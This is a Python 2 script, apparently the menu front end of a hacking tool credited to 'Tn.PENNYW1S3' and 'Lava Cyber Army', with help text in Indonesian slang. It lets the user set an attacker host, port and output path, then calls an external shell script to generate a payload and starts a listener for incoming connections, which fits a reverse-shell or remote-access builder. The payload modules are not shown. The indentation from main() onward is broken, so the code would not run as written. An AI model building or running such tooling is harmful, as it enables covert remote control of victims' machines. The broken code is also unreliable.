#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os, sys, subprocess
from time import sleep
os.system("clear")
reload(sys)
sys.setdefaultencoding("utf-8")

host = " "
port = " "
output = " "

def logo():
 print("""
\t  .                           , .  C ____     ___  ___ ___  ____    ___
\t                         ( \( \ )  O|    \   /  _]|   |   ||    \  /   \
\t ,_  P E N N Y W 1 S 3  ;    o >   R|  D  ) /  [_ | _   _ ||  o  )|     |
\t  { `--.               /    (_)    A|    / |    _]|  \_/  ||     ||  O  |
\t  `={ \`-.___/`    |  |    \       Z|   [_ |   |  |   |   ||  O  ||     |
\t   `-{    /      -=`\     |        O|  .  \|     ||   |   ||     ||     |
\t     `={   -= = _/    /   |        N|__|\_||_____||___|___||_____| \___/
\t        `\       .-'     /`        #####################################
\t         {`-_.'===,    _/          |Author   : Tn.PENNYW1S3            |
\t         / /`       `\\            |Thank to : Lava Cyber Army         |
\t        / /         '/=            |Kontak   : 083871259489            |
\t       `\=                         #####################################
  """)

def help():
 print("""
  Commands :
       set HOST       : Nyeting Host Lu (Contoh set HOST 127.0.0.1)
       set PORT       : Nyeting PORT Lu (Contoh set PORT 1337)
       set OUTPUT     : Nyeting Output Name Sama Path Punya Lu (Conto set o set OUTPUT /home/payload)
       show values    : Nampilin Host, Port Sama Output Value
       start listener : Mulai Koneksi Server Lu

  Chat Gw Kalo Kamu Kangen :v
  WA : 083871259489\n""")

  def main():
  global host, port, output

  while True:
  cmd = raw_input("[*] Tn.PENNYW1S3@Lava:~# ").lower()

  if cmd == "help":
  help()

  elif cmd == 'banner':
  os.system("clear")
  logo()
  main()

  elif "clear" in cmd:
  os.system("clear")

  elif "set host" in cmd:
  host = cmd.split()[-1]

  elif "set port" in cmd:
  port = int(cmd.split()[-1])

  elif "set output" in cmd:
  output = cmd.split()[-1]

  elif cmd == "show values":
  print "\n[+] HOST   : %s\n[+] PORT   : %s\n[+] OUTPUT : %s\n"%(host, port,output)

  elif cmd == "generate payload" or cmd == "generate":
  if host != " " and port != " " and output != " ":
  print("[+] Generating Payload . . .")
  sleep(1)
  print("[*] Using Configuration . . .\n |_ HOST   : "+host+"\n |_ PORT   : "+str(port)+"\n |_ OUTPUT : "+output)
  sleep(3)
  os.system("sh modules/gen.sh "+host+" "+str(port)+" "+output)
  print("[+] Generating Success . . .")
  sleep(1)
  main()
  else:
  print "\n[!] HOST   : %s\n[!] PORT   : %s\n[!] OUTPUT : %s\ n " % (host, port, output)

  elif cmd == "start" or cmd == "run" or cmd == "start listener":
  if host != " " and port != " ":
  if os.name == "nt":
  subprocess.Popen([sys.executable, 'modules/listener.py', host, str(port)], creationflags=subprocess.CREATE_NEW_CONSOLE)
  else:
  os.system(sys.executable + " modules/listener.py %s %s"%(host, str(port)))
  else:
  print "\n[!] Host : %s\n[!] Port : %s\n"%(host,port)
  else:
  print("[!] Cek Command Lu Boejang. . .")
  main()

  def contol():
  try:
  logo()
  main()
  except KeyboardInterrupt:
  print("\n[!] CTRL+C Buat Keluar Dari Sini :( . . .")
  sleep(2)
  sys.exit()
  if __name__ == "__main__":
  contol()
